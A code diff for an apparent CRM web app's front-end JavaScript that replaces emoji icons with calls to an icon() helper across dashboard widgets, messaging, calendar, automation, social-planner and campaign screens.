   const h=new Date().getHours();
   const greet=h<12?'Good morning':h<17?'Good afternoon':'Good evening';
   const name=currentUser?currentUser.name.split(' ')[0]:'';
-  document.getElementById('dash-greeting').textContent=`${greet}, ${name} 👋`;
+  document.getElementById('dash-greeting').textContent=`${greet}, ${name} `;
   const grid=document.getElementById('widget-grid');
   grid.innerHTML=activeWidgets.map(wid=>{
     const def=WIDGET_CATALOG.find(w=>w.id===wid); if(!def) return '';
@@ -7815,22 +7872,22 @@ function renderDashboard(){
 
 function buildWidgetContent(wid,def){
   const pipeline=getActivePipeline();
-  if(wid==='stat-leads') return statWidget('👥','Total Leads',contacts.length,contacts.length+' contacts in CRM','up');
-  if(wid==='stat-deals'){const cnt=pipelines.reduce((s,p)=>s+p.deals.length,0);return statWidget('🤝','Active Deals',cnt,'across all pipelines','up');}
-  if(wid==='stat-revenue'){const total=pipelines.reduce((s,p)=>s+p.deals.reduce((a,d)=>a+d.value,0),0);return statWidget('💰','Est. Revenue',formatCurrency(total)+'/mo','total pipeline value','up');}
-  if(wid==='stat-emails'){const sent=emailStore.filter(e=>e.status==='sent'||e.status==='delivered').length;return statWidget('📧','Emails Sent',sent,sent+' emails sent so far','up');}
+  if(wid==='stat-leads') return statWidget(icon('users'),'Total Leads',contacts.length,contacts.length+' contacts in CRM','up');
+  if(wid==='stat-deals'){const cnt=pipelines.reduce((s,p)=>s+p.deals.length,0);return statWidget(icon('briefcase'),'Active Deals',cnt,'across all pipelines','up');}
+  if(wid==='stat-revenue'){const total=pipelines.reduce((s,p)=>s+p.deals.reduce((a,d)=>a+d.value,0),0);return statWidget(icon('dollar'),'Est. Revenue',formatCurrency(total)+'/mo','total pipeline value','up');}
+  if(wid==='stat-emails'){const sent=emailStore.filter(e=>e.status==='sent'||e.status==='delivered').length;return statWidget(icon('mail'),'Emails Sent',sent,sent+' emails sent so far','up');}
 
   if(wid==='activity'){
     // Build real activity from contacts + conversations + emails
     const items=[];
-    contacts.slice(0,3).forEach(c=>items.push({icon:'👤',text:`Contact added: <strong>${c.name}</strong>`,sub:c.company||c.source||'',ts:c.created_at||''}));
+    contacts.slice(0,3).forEach(c=>items.push({icon:icon('user'),text:`Contact added: <strong>${c.name}</strong>`,sub:c.company||c.source||'',ts:c.created_at||''}));
     conversations.slice(0,2).forEach(cv=>{
       const contact=contacts.find(x=>x.id===cv.contactId);
       const last=cv.messages?.[cv.messages.length-1];
-      if(contact&&last) items.push({icon:last.ch==='email'?'📧':'💬',text:`Message with <strong>${contact.name}</strong>`,sub:last.body?.slice(0,40)||'',ts:last.ts||''});
+      if(contact&&last) items.push({icon:last.ch==='email'?'':'',text:`Message with <strong>${contact.name}</strong>`,sub:last.body?.slice(0,40)||'',ts:last.ts||''});
     });
     items.sort((a,b)=>new Date(b.ts)-new Date(a.ts));
-    return `<div class="widget-title"><span class="widget-title-icon">🕐</span>Recent Activity</div>
+    return `<div class="widget-title"><span class="widget-title-icon">${icon('clock')}</span>Recent Activity</div>
       ${items.length===0?'<div style="font-size:12px;color:var(--text3)">Activity will appear here as you use the CRM</div>'
       :items.slice(0,5).map(it=>`<div class="w-act-item"><div class="w-act-dot">${it.icon}</div><div><div class="w-act-text">${it.text}</div><div class="w-act-time">${it.sub}</div></div></div>`).join('')}`;
   }
@@ -7839,29 +7896,29 @@ function buildWidgetContent(wid,def){
     // Pull upcoming calendar events as tasks
     const now=new Date();
     const upcoming=calEvents.filter(e=>new Date(e.start)>now).sort((a,b)=>new Date(a.start)-new Date(b.start)).slice(0,3);
-    return `<div class="widget-title"><span class="widget-title-icon">✅</span>Upcoming Events</div>
+    return `<div class="widget-title"><span class="widget-title-icon">${icon('check')}</span>Upcoming Events</div>
       ${upcoming.length===0?'<div style="font-size:12px;color:var(--text3)">No upcoming events. <a href="#" onclick="navigate(\'calendar\');return false" style="color:var(--accent2)">Add one →</a></div>'
       :upcoming.map(ev=>{
         const d=new Date(ev.start);
         const dateStr=d.toLocaleDateString([],{weekday:'short',month:'short',day:'numeric'});
         const timeStr=d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
-        return `<div class="w-task" onclick="navigate('calendar')"><div class="w-task-name">${ev.title}</div><div class="w-task-meta">📅 ${dateStr} · ${timeStr}</div></div>`;
+        return `<div class="w-task" onclick="navigate('calendar')"><div class="w-task-name">${ev.title}</div><div class="w-task-meta">${icon('calendar')} ${dateStr} · ${timeStr}</div></div>`;
       }).join('')}
       <div style="font-size:11px;color:var(--text3);margin-top:8px;text-align:center"><a href="#" onclick="navigate('calendar');return false" style="color:var(--accent2)">View all →</a></div>`;
   }
 
-  if(wid==='quick-actions') return `<div class="widget-title"><span class="widget-title-icon">⚡</span>Quick Actions</div>
+  if(wid==='quick-actions') return `<div class="widget-title"><span class="widget-title-icon">${icon('bolt')}</span>Quick Actions</div>
     <div class="w-quick-grid">
-      <div class="w-quick-btn" onclick="navigate('contacts');openContactModal()"><span class="w-quick-icon">➕</span>Add Contact</div>
-      <div class="w-quick-btn" onclick="navigate('pipeline');openPipelineModal('new-deal')"><span class="w-quick-icon">💼</span>Add Deal</div>
-      <div class="w-quick-btn" onclick="navigate('conversations')"><span class="w-quick-icon">💬</span>Conversations</div>
-      <div class="w-quick-btn" onclick="navigate('email');openComposeEmail()"><span class="w-quick-icon">📧</span>Compose Email</div>
+      <div class="w-quick-btn" onclick="navigate('contacts');openContactModal()"><span class="w-quick-icon">${icon('plus')}</span>Add Contact</div>
+      <div class="w-quick-btn" onclick="navigate('pipeline');openPipelineModal('new-deal')"><span class="w-quick-icon">${icon('briefcase')}</span>Add Deal</div>
+      <div class="w-quick-btn" onclick="navigate('conversations')"><span class="w-quick-icon">${icon('message')}</span>Conversations</div>
+      <div class="w-quick-btn" onclick="navigate('email');openComposeEmail()"><span class="w-quick-icon">${icon('mail')}</span>Compose Email</div>
     </div>`;
 
   if(wid==='automations'){
     const active=workflows.filter(w=>w.active).length;
     const total=workflows.length;
-    return `<div class="widget-title"><span class="widget-title-icon">🤖</span>Automations</div>
+    return `<div class="widget-title"><span class="widget-title-icon">${icon('bot')}</span>Automations</div>
       ${total===0?`<div style="font-size:12px;color:var(--text3)">No workflows yet. <a href="#" onclick="navigate('automations');return false" style="color:var(--accent2)">Create one →</a></div>`
       :workflows.slice(0,4).map(w=>`<div class="w-auto-row"><div class="w-auto-name">${w.name}</div><span class="w-auto-status ${w.active?'w-auto-on':'w-auto-off'}">${w.active?'On':'Off'}</span></div>`).join('')}
       ${total>0?`<div style="font-size:11px;color:var(--text3);margin-top:8px">${active} of ${total} active · <a href="#" onclick="navigate('automations');return false" style="color:var(--accent2)">Manage →</a></div>`:''}`;
@@ -7869,12 +7926,12 @@ function buildWidgetContent(wid,def){
 
   if(wid==='contacts-list'){
     const rows=contacts.slice(0,5).map(c=>`<div class="w-contact-row"><div class="av-sm ${getAv(c.id)}" style="width:24px;height:24px;font-size:9px">${initials(c.name)}</div><div class="w-contact-info"><div class="w-contact-name">${pName(c.name)}</div><div class="w-contact-co">${c.company?pCompany(c.company):''}</div></div><span class="pill pill-${c.status}">${c.status}</span></div>`).join('');
-    return `<div class="widget-title"><span class="widget-title-icon">👤</span>Recent Contacts</div>${rows||'<div style="font-size:12px;color:var(--text3)">No contacts yet</div>'}`;
+    return `<div class="widget-title"><span class="widget-title-icon">${icon('user')}</span>Recent Contacts</div>${rows||'<div style="font-size:12px;color:var(--text3)">No contacts yet</div>'}`;
   }
 
   if(wid==='pipeline-mini'&&pipeline){
     const max=Math.max(...pipeline.stages.map(s=>pipeline.deals.filter(d=>d.stage===s.id).length),1);
-    return `<div class="widget-title"><span class="widget-title-icon">📊</span>Pipeline — ${pipeline.name}</div>`+
+    return `<div class="widget-title"><span class="widget-title-icon">${icon('chart')}</span>Pipeline — ${pipeline.name}</div>`+
       pipeline.stages.map(s=>{const cnt=pipeline.deals.filter(d=>d.stage===s.id).length;return `<div class="w-pipeline-stage"><span class="w-stage-label">${s.label}</span><div class="w-stage-bar"><div class="w-stage-fill" style="width:${Math.round((cnt/max)*100)}%"></div></div><span class="w-stage-cnt">${cnt}</span></div>`;}).join('');
   }
 
@@ -8342,7 +8399,7 @@ async function saveIntegration(key){
     markIntConnected(key, data);
     updateIntCount();
     populateContactDropdowns();
-    showToast(`${key.charAt(0).toUpperCase()+key.slice(1)} connected! ✅`);
+    showToast(`${key.charAt(0).toUpperCase()+key.slice(1)} connected! ${icon('check')}`);
   } catch(e){
     showToast('Failed to save: '+e.message, 'error');
   }
@@ -8412,14 +8469,14 @@ async function sendSMS(){
     });
     const data = await r.json();
     if(!r.ok||data.error) throw new Error(data.error||'Send failed');
-    addIntLog('sms-log',`✅ SMS sent to ${to} — "${body.slice(0,40)}${body.length>40?'…':''}"`, 'ok');
+    addIntLog('sms-log',`${icon('check')} SMS sent to ${to} — "${body.slice(0,40)}${body.length>40?'…':''}"`, 'ok');
     document.getElementById('sms-body').value='';
     document.getElementById('sms-char-count').textContent='0 / 160';
-    showToast('SMS sent! ✅');
+    showToast('SMS sent! ');
     logActivity('sms', `SMS sent to ${to}: "${body.slice(0,60)}"`);
     fireZapierEvent('sms_sent', {to, body, from});
   } catch(e){
-    addIntLog('sms-log','❌ Failed: '+e.message,'err');
+    addIntLog('sms-log','Failed: '+e.message,'err');
     showToast('SMS failed: '+e.message,'error');
     logError('sendSMS', e.message, e.stack, { to });
   }
@@ -8479,17 +8536,17 @@ async function sendEmail(){
       });
     }
     if(res && (res.ok||res.status===202)){
-      addIntLog('email-log',`✅ Email sent to ${toAddr} — "${subject}"`,'ok');
+      addIntLog('email-log',`${icon('check')} Email sent to ${toAddr} — "${subject}"`,'ok');
       document.getElementById('email-body').value='';
       document.getElementById('email-subject').value='';
-      showToast('Email sent! ✅');
+      showToast('Email sent! ');
       logActivity('email',`Email sent to ${toAddr}: "${subject}"`);
       fireZapierEvent('email_sent',{to:toAddr,subject,fromAddr});
     } else {
       const err = res ? await res.json() : {};
-      addIntLog('email-log','❌ Failed: '+(err.message||err.errors?.[0]?.message||'Check your API key'),'err');
+      addIntLog('email-log','Failed: '+(err.message||err.errors?.[0]?.message||'Check your API key'),'err');
     }
-  } catch(e){ addIntLog('email-log','❌ Error: '+e.message,'err'); }
+  } catch(e){ addIntLog('email-log','Error: '+e.message,'err'); }
 }
 
 function updateEmailPlaceholders(){
@@ -8585,7 +8642,7 @@ async function gcalOnConnected(){
   markIntConnected('calendar',{});
   updateIntCount();
   gcalPopulateContacts();
-  showToast('Google Calendar connected! ✅');
+  showToast('Google Calendar connected! ');
 }
 
 function gcalCheckAndRestoreSession(){
@@ -8679,7 +8736,7 @@ async function gcalCreateEvent(){
       const htmlLink = data.htmlLink||'';
       if(logEl) logEl.innerHTML = `
         <div style="background:var(--green-bg);border:1px solid rgba(62,207,142,.2);border-radius:var(--radius);padding:12px;font-size:12px;color:var(--green)">
-          ✅ Event created!${guestEmail?` Invite sent to <strong>${guestEmail}</strong>`:''}<br>
+          ${icon('check')} Event created!${guestEmail?` Invite sent to <strong>${guestEmail}</strong>`:''}<br>
           ${htmlLink?`<a href="${htmlLink}" target="_blank" style="color:var(--accent2)">Open in Google Calendar →</a>`:''}
           ${meetLink?`<br><a href="${meetLink}" target="_blank" style="color:var(--accent2)">Join Google Meet →</a>`:''}
         </div>`;
@@ -8694,15 +8751,15 @@ async function gcalCreateEvent(){
       document.getElementById('gcal-title').value='';
       document.getElementById('gcal-notes').value='';
       document.getElementById('gcal-guest-email').value='';
-      showToast('Event created in Google Calendar! ✅');
+      showToast('Event created in Google Calendar! ');
     } else {
       const msg = data.error?.message||'Unknown error';
-      if(logEl) logEl.innerHTML=`<div style="color:var(--red);font-size:12px">❌ ${msg}</div>`;
+      if(logEl) logEl.innerHTML=`<div style="color:var(--red);font-size:12px">${icon('x')} ${msg}</div>`;
       if(data.error?.status==='UNAUTHENTICATED'){ gcalDisconnect(); showToast('Session expired — please reconnect','error'); }
       else showToast('Error: '+msg,'error');
     }
   } catch(e){
-    if(logEl) logEl.innerHTML=`<div style="color:var(--red);font-size:12px">❌ Network error: ${e.message}</div>`;
+    if(logEl) logEl.innerHTML=`<div style="color:var(--red);font-size:12px">${icon('x')} Network error: ${e.message}</div>`;
     showToast('Network error','error');
   }
 }
@@ -9110,7 +9167,7 @@ function _eventItemHTML(ev){
           ${ev.followupType?followupTypeChip(ev.followupType):''}
         </div>
         <div class="cal-upcoming-time" style="margin-top:3px">${dateStr} · ${timeStr}</div>
-        ${contact?`<div style="font-size:10px;color:var(--text3);margin-top:2px">👤 ${pName(contact.name)}</div>`:''}
+        ${contact?`<div style="font-size:10px;color:var(--text3);margin-top:2px">${icon('user')} ${pName(contact.name)}</div>`:''}
       </div>
     </div>
   </div>`;
@@ -9372,7 +9429,7 @@ function openEventModal(date){
       <div>
         <div class="modal-title">New Event</div>
         ${gcalConnected?`<div style="font-size:11px;color:var(--green);margin-top:2px">✓ Will sync to Google Calendar</div>`:
-          `<div style="font-size:11px;color:var(--amber);margin-top:2px">⚠ Connect Google Calendar in Integrations to sync</div>`}
+          `<div style="font-size:11px;color:var(--amber);margin-top:2px">${icon('alert')} Connect Google Calendar in Integrations to sync</div>`}
       </div>
       <span class="modal-close" onclick="closeModal()">×</span>
     </div>
@@ -9570,7 +9627,7 @@ async function saveCalEvent(){
         renderCalendar();
         renderUpcomingEvents();
         const guestNames = _evGuests.length ? ` · Invite sent to ${_evGuests.length} guest(s)` : '';
-        showToast(`✅ Event synced to Google Calendar${guestNames}`);
+        showToast(`${icon('check')} Event synced to Google Calendar${guestNames}`);
       } else {
         closeModal(); renderCalendar(); renderUpcomingEvents();
         showToast('Saved locally (Google Calendar error: '+data.error?.message+')','error');
@@ -9657,7 +9714,7 @@ function openCalSourceModal(){
     <div class="modal-head"><div class="modal-title">Add Calendar</div><span class="modal-close" onclick="closeModal()">×</span></div>
     <div class="modal-body">
       ${gcalConnected?`<div style="background:var(--green-bg);border:1px solid rgba(62,207,142,.2);border-radius:var(--radius);padding:10px 12px;margin-bottom:14px;display:flex;align-items:center;gap:10px;cursor:pointer" onclick="addGcalSource()">
-        <span style="font-size:18px">📅</span>
+        <span style="font-size:18px">${icon('calendar')}</span>
         <div style="flex:1"><div style="font-size:13px;font-weight:500;color:var(--green)">Add Google Calendar</div><div style="font-size:11px;color:var(--text3)">${gcalEmail}</div></div>
         <button class="btn btn-sm" style="background:var(--green-bg);color:var(--green);border-color:rgba(62,207,142,.3)">Add</button>
       </div>`:''}
@@ -9702,14 +9759,14 @@ let workflows = [];
 let currentWorkflow = null; // workflow being edited
 
 const STEP_TYPES = {
-  email:       { icon:'📧', label:'Send Email',       color:'var(--accent-bg)',  iconColor:'var(--accent2)' },
-  sms:         { icon:'📱', label:'Send SMS',         color:'var(--red-bg)',     iconColor:'var(--red)' },
-  notify:      { icon:'🔔', label:'Internal Notification', color:'var(--amber-bg)', iconColor:'var(--amber)' },
-  wait:        { icon:'⏱',  label:'Wait',             color:'var(--bg4)',        iconColor:'var(--text3)' },
-  tag:         { icon:'🏷',  label:'Add/Remove Tag',   color:'var(--green-bg)',   iconColor:'var(--green)' },
-  pipeline:    { icon:'📊', label:'Move Pipeline Stage', color:'var(--purple-bg)', iconColor:'var(--purple)' },
-  branch:      { icon:'🔀', label:'If/Else Branch',   color:'var(--pink-bg)',    iconColor:'var(--pink)' },
-  webhook:     { icon:'🔗', label:'Send Webhook',     color:'var(--amber-bg)',   iconColor:'var(--amber)' },
+  email:       { icon:icon('mail'), label:'Send Email',       color:'var(--accent-bg)',  iconColor:'var(--accent2)' },
+  sms:         { icon:icon('smartphone'), label:'Send SMS',         color:'var(--red-bg)',     iconColor:'var(--red)' },
+  notify:      { icon:icon('bell'), label:'Internal Notification', color:'var(--amber-bg)', iconColor:'var(--amber)' },
+  wait:        { icon:icon('clock'),  label:'Wait',             color:'var(--bg4)',        iconColor:'var(--text3)' },
+  tag:         { icon:icon('tag'),  label:'Add/Remove Tag',   color:'var(--green-bg)',   iconColor:'var(--green)' },
+  pipeline:    { icon:icon('chart'), label:'Move Pipeline Stage', color:'var(--purple-bg)', iconColor:'var(--purple)' },
+  branch:      { icon:icon('shuffle'), label:'If/Else Branch',   color:'var(--pink-bg)',    iconColor:'var(--pink)' },
+  webhook:     { icon:icon('link'), label:'Send Webhook',     color:'var(--amber-bg)',   iconColor:'var(--amber)' },
 };
 
 async function saveWorkflows(){
@@ -9728,14 +9785,14 @@ function renderAutoList(){
   const el = document.getElementById('auto-workflow-list'); if(!el) return;
   if(workflows.length===0){
     el.innerHTML = `<div style="text-align:center;padding:48px;color:var(--text3)">
-      <div style="font-size:32px;margin-bottom:12px">⚡</div>
+      <div style="font-size:32px;margin-bottom:12px">${icon('bolt')}</div>
       <div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No automations yet</div>
       <div style="font-size:12px">Create your first workflow to start automating your outreach</div>
     </div>`; return;
   }
   el.innerHTML = workflows.map(wf=>`
     <div class="wf-card" onclick="editWorkflow('${wf.id}')">
-      <div class="wf-icon" style="background:var(--accent-bg)">⚡</div>
+      <div class="wf-icon" style="background:var(--accent-bg)">${icon('bolt')}</div>
       <div class="wf-info">
         <div class="wf-name">${wf.name||'Untitled Workflow'}</div>
         <div class="wf-meta">${wf.steps.length} step${wf.steps.length!==1?'s':''} · Created ${new Date(wf.createdAt).toLocaleDateString()}</div>
@@ -10113,11 +10170,11 @@ function clearLogs(){
 // SOCIAL MEDIA PLANNER
 // ═══════════════════════════════════════════════
 const SOC_PLATFORMS = [
-  {id:'facebook',  label:'Facebook',  icon:'📘', color:'#1877F2', limit:63206},
-  {id:'instagram', label:'Instagram', icon:'📸', color:'#E1306C', limit:2200},
-  {id:'twitter',   label:'X/Twitter', icon:'🐦', color:'#1DA1F2', limit:280},
-  {id:'linkedin',  label:'LinkedIn',  icon:'💼', color:'#0A66C2', limit:3000},
-  {id:'tiktok',    label:'TikTok',    icon:'🎵', color:'#010101', limit:2200},
+  {id:'facebook',  label:'Facebook',  icon:icon('book'), color:'#1877F2', limit:63206},
+  {id:'instagram', label:'Instagram', icon:icon('camera'), color:'#E1306C', limit:2200},
+  {id:'twitter',   label:'X/Twitter', icon:icon('twitter'), color:'#1DA1F2', limit:280},
+  {id:'linkedin',  label:'LinkedIn',  icon:icon('briefcase'), color:'#0A66C2', limit:3000},
+  {id:'tiktok',    label:'TikTok',    icon:icon('music'), color:'#010101', limit:2200},
 ];
 
 const SOC_MONTHS = ['January','February','March','April','May','June','July','August','September','October','November','December'];
@@ -10319,7 +10376,7 @@ function renderSocList(container){
 
   if(posts.length===0){
     container.innerHTML=`<div style="text-align:center;padding:48px;color:var(--text3)">
-      <div style="font-size:32px;margin-bottom:10px">📭</div>
+      <div style="font-size:32px;margin-bottom:10px">${icon('mail')}</div>
       <div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No posts this month</div>
       <div style="font-size:12px">Click "+ New Post" to schedule your first post</div>
     </div>`; return;
@@ -10356,7 +10413,7 @@ function renderSocListCard(p, isPast){
   const platforms=p.platforms.map(id=>SOC_PLATFORMS.find(x=>x.id===id)).filter(Boolean);
   const time=p.scheduledAt?new Date(p.scheduledAt).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}):'';
   return `<div class="soc-list-card ${isPast?'past':''}" onclick="openSocEditModal('${p.id}')">
-    <div class="soc-platform-icon" style="background:${platforms[0]?.color||'var(--bg4)'}20">${platforms[0]?.icon||'📱'}</div>
+    <div class="soc-platform-icon" style="background:${platforms[0]?.color||'var(--bg4)'}20">${platforms[0]?.icon|| icon('smartphone')}</div>
     <div class="soc-list-body">
       <div class="soc-list-caption">${escHtml(p.caption)}</div>
       <div class="soc-list-meta">
@@ -10364,8 +10421,8 @@ function renderSocListCard(p, isPast){
         <div class="soc-list-platforms">${platforms.map(pl=>`<span title="${pl.label}" style="font-size:14px">${pl.icon}</span>`).join('')}</div>
         ${p.status==='published'?`
           <span class="soc-stat-mini">❤️ ${p.likes||0}</span>
-          <span class="soc-stat-mini">💬 ${p.comments||0}</span>
-          <span class="soc-stat-mini">🔁 ${p.shares||0}</span>`:''}
+          <span class="soc-stat-mini">${icon('message')} ${p.comments||0}</span>
+          <span class="soc-stat-mini">${icon('refresh')} ${p.shares||0}</span>`:''}
       </div>
     </div>
     <div class="soc-status-badge ${statusCls(p.status)}">${p.status.charAt(0).toUpperCase()+p.status.slice(1)}</div>
@@ -10376,7 +10433,7 @@ function renderSocListCard(p, isPast){
 function renderSocGrid(container){
   const posts=getFilteredPosts().sort((a,b)=>new Date(b.scheduledAt||0)-new Date(a.scheduledAt||0));
   if(posts.length===0){
-    container.innerHTML=`<div style="text-align:center;padding:48px;color:var(--text3)"><div style="font-size:32px;margin-bottom:10px">🖼️</div><div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No posts yet</div></div>`; return;
+    container.innerHTML=`<div style="text-align:center;padding:48px;color:var(--text3)"><div style="font-size:32px;margin-bottom:10px">${icon('image')}</div><div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No posts yet</div></div>`; return;
   }
   container.innerHTML=`<div class="soc-grid">${posts.map(p=>{
     const platforms=p.platforms.map(id=>SOC_PLATFORMS.find(x=>x.id===id)).filter(Boolean);
@@ -10384,9 +10441,9 @@ function renderSocGrid(container){
     const time=p.scheduledAt?new Date(p.scheduledAt).toLocaleDateString('en-US',{month:'short',day:'numeric'}):'';
     return `<div class="soc-grid-card" onclick="openSocEditModal('${p.id}')">
       <div class="soc-grid-img" style="background:${plColor}18">
-        ${platforms[0]?.icon||'📱'}
+        ${platforms[0]?.icon|| icon('smartphone')}
         <div class="soc-grid-overlay">
-          <span style="color:#fff;font-size:20px">✏️</span>
+          <span style="color:#fff;font-size:20px"></span>
         </div>
       </div>
       <div class="soc-grid-body">
@@ -10432,14 +10489,14 @@ function openSocPostModal(defaultDate){
       <!-- Caption -->
       <div class="form-group">
         <label class="form-label">Caption / Content</label>
-        <textarea class="form-textarea" id="soc-caption" style="min-height:110px" placeholder="Write your post caption here… Use emojis! 🚀&#10;&#10;Tip: Hashtags go at the end." oninput="updateSocCharCount(this)"></textarea>
+        <textarea class="form-textarea" id="soc-caption" style="min-height:110px" placeholder="Write your post caption here… Use emojis! ${icon('rocket')}&#10;&#10;Tip: Hashtags go at the end." oninput="updateSocCharCount(this)"></textarea>
         <div class="soc-char-counter" id="soc-char-count">0 characters</div>
       </div>
       <!-- Image upload -->
       <div class="form-group">
         <label class="form-label">Media (optional)</label>
         <div class="soc-image-drop" onclick="document.getElementById('soc-img-input').click()">
-          📎 Click to attach images or videos
+          ${icon('paperclip')} Click to attach images or videos
           <input type="file" id="soc-img-input" accept="image/*,video/*" multiple style="display:none" onchange="handleSocImages(event)"/>
         </div>
         <div class="soc-image-preview" id="soc-img-preview"></div>
@@ -10529,7 +10586,7 @@ function saveSocPost(forceStatus){
   socImageDataUrls=[];
   closeModal();
   renderSocialPlanner();
-  showToast(status==='draft'?'Draft saved!':'Post scheduled! ✅');
+  showToast(status==='draft'?'Draft saved!':'Post scheduled! ');
 }
 
 // ── EDIT / VIEW POST MODAL ──
@@ -10551,14 +10608,14 @@ function openSocEditModal(postId){
       <!-- Status badge -->
       <div style="margin-bottom:14px">
         <span class="soc-status-badge ${statusCls(p.status)}" style="font-size:12px;padding:4px 12px">${p.status.charAt(0).toUpperCase()+p.status.slice(1)}</span>
-        ${isPast&&p.status==='scheduled'?`<span style="font-size:11px;color:var(--amber);margin-left:8px">⚠️ This post was scheduled in the past</span>`:''}
+        ${isPast&&p.status==='scheduled'?`<span style="font-size:11px;color:var(--amber);margin-left:8px">${icon('alert')} This post was scheduled in the past</span>`:''}
       </div>
       <!-- Engagement stats for published posts -->
       ${p.status==='published'?`
         <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px">
           <div class="stat-card" style="padding:12px;text-align:center"><div class="stat-label">Likes</div><div class="stat-val" style="font-size:20px;color:var(--pink)">❤️ ${p.likes||0}</div></div>
-          <div class="stat-card" style="padding:12px;text-align:center"><div class="stat-label">Comments</div><div class="stat-val" style="font-size:20px;color:var(--accent2)">💬 ${p.comments||0}</div></div>
-          <div class="stat-card" style="padding:12px;text-align:center"><div class="stat-label">Shares</div><div class="stat-val" style="font-size:20px;color:var(--green)">🔁 ${p.shares||0}</div></div>
+          <div class="stat-card" style="padding:12px;text-align:center"><div class="stat-label">Comments</div><div class="stat-val" style="font-size:20px;color:var(--accent2)">${icon('message')} ${p.comments||0}</div></div>
+          <div class="stat-card" style="padding:12px;text-align:center"><div class="stat-label">Shares</div><div class="stat-val" style="font-size:20px;color:var(--green)">${icon('refresh')} ${p.shares||0}</div></div>
         </div>`:''}
       <!-- Caption edit -->
       <div class="form-group">
@@ -10584,7 +10641,7 @@ function openSocEditModal(postId){
       </div>
       ${p.status==='published'?`
         <div style="padding:10px 12px;background:var(--green-bg);border:1px solid rgba(62,207,142,.2);border-radius:var(--radius);font-size:12px;color:var(--green);margin-top:8px">
-          ✅ This post has been published. You can update engagement stats manually above.
+          ${icon('check')} This post has been published. You can update engagement stats manually above.
         </div>`:''}
     </div>
     <div class="modal-foot">
@@ -10659,9 +10716,9 @@ function setToolsView(view){
   renderToolsPage();
 }
 const TOOLS_FORMS = [
-  { icon:'📋', title:'VA Application', path:'/apply',
+  { icon:icon('clipboard'), title:'VA Application', path:'/apply',
     desc:'5-tab application for virtual assistants. Submissions land under Matching → VA Applicants.' },
-  { icon:'🤝', title:'Client Intake', path:'/client-intake',
+  { icon:icon('users'), title:'Client Intake', path:'/client-intake',
     desc:'3-tab intake for new clients. Submissions land under Matching → Client Intakes.' },
 ];
 
@@ -10694,7 +10751,7 @@ function renderToolsPage(){
           <div style="font-size:12px;color:var(--text3);margin-top:2px">${f.desc}</div>
           <input class="form-input" readonly value="${url}" onclick="this.select()" style="margin-top:10px;width:100%;font-family:'DM Mono',monospace;font-size:12px"/>
           <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:10px">
-            <button class="btn btn-sm btn-primary" onclick="copyFormLink('${url}')">🔗 Copy link</button>
+            <button class="btn btn-sm btn-primary" onclick="copyFormLink('${url}')">${icon('link')} Copy link</button>
             <button class="btn btn-sm" onclick="window.open('${url}','_blank','noopener')">↗ Open form</button>
           </div>
         </div>
@@ -10743,7 +10800,7 @@ async function loadCustomForms(){
         </div>
         <button class="btn btn-sm" onclick="editCustomForm('${f.id}')">Edit</button>
         <button class="btn btn-sm" onclick="viewFormResponses('${f.id}')">Responses (${n})</button>
-        ${pub?`<button class="btn btn-sm" onclick="copyFormLink('${url}')">🔗 Copy</button><button class="btn btn-sm" onclick="window.open('${url}','_blank','noopener')">↗ Open</button>`:''}
+        ${pub?`<button class="btn btn-sm" onclick="copyFormLink('${url}')">${icon('link')} Copy</button><button class="btn btn-sm" onclick="window.open('${url}','_blank','noopener')">↗ Open</button>`:''}
         <button class="btn btn-sm" style="color:#dc2626" onclick="deleteCustomForm('${f.id}')">Delete</button>
       </div>
     </div>`;
@@ -10981,7 +11038,7 @@ function openCreateTagModal(){
       <div class="form-group">
         <label class="form-label">Tag Label</label>
         <input class="form-input" id="new-tag-name" placeholder="e.g. VIP, Hot Lead, Retainer…" oninput="checkTagDuplicate(this.value)"/>
-        <div id="tag-dup-warning" style="display:none;font-size:11px;color:var(--amber);margin-top:4px">⚠ A tag with this name already exists</div>
+        <div id="tag-dup-warning" style="display:none;font-size:11px;color:var(--amber);margin-top:4px">${icon('alert')} A tag with this name already exists</div>
       </div>
       <div class="form-group"><label class="form-label">Color</label>
         <div class="tag-color-pick" id="tag-color-pick" style="margin-top:8px">
@@ -11025,7 +11082,7 @@ function renameTagModal(oldLabel, cls){
     <div class="modal-body">
       <div class="form-group"><label class="form-label">New Label</label>
         <input class="form-input" id="rename-tag-input" value="${oldLabel}" oninput="checkTagDuplicate(this.value)"/>
-        <div id="tag-dup-warning" style="display:none;font-size:11px;color:var(--amber);margin-top:4px">⚠ A tag with this name already exists</div>
+        <div id="tag-dup-warning" style="display:none;font-size:11px;color:var(--amber);margin-top:4px">${icon('alert')} A tag with this name already exists</div>
       </div>
     </div>
     <div class="modal-foot"><button class="btn" onclick="closeModal()">Cancel</button><button class="btn btn-primary" onclick="renameTag('${oldLabel}','${cls}')">Rename</button></div>`);
@@ -11247,7 +11304,7 @@ function renderClientsPage(){
       <td onclick="editClientCell('${c.id}','va_rate')" style="cursor:pointer;font-family:'DM Mono',monospace;font-size:12px" title="Click to edit VA rate">${vaRateTxt}</td>
       <td onclick="editClientCell('${c.id}','agency_cut')" style="cursor:pointer;font-family:'DM Mono',monospace;font-size:12px" title="Click to edit agency cut">${agencyCutTxt}</td>
       <td style="font-size:11px;color:var(--text3)">${lastAct}</td>
-      <td style="white-space:nowrap"><button class="btn btn-sm" onclick="openContactDetail('${c.id}')">View</button> <button class="btn btn-sm" style="font-size:11px" onclick="openConvWithContact('${c.id}')">💬</button></td>
+      <td style="white-space:nowrap"><button class="btn btn-sm" onclick="openContactDetail('${c.id}')">View</button> <button class="btn btn-sm" style="font-size:11px" onclick="openConvWithContact('${c.id}')">${icon('message')}</button></td>
     </tr>`;
   }).join('');
 }
@@ -11367,11 +11424,11 @@ function renderCampStats(){
 function renderCampList(){
   const el = document.getElementById('camp-list-table'); if(!el) return;
   if(campaigns.length===0){
-    el.innerHTML=`<div style="text-align:center;padding:48px;color:var(--text3)"><div style="font-size:32px;margin-bottom:12px">📣</div><div style="font-size:14px;font-weight:500;color:var(--text);margin-bottom:6px">No campaigns yet</div><div style="font-size:12px">Create your first campaign to start reaching your contacts</div></div>`;
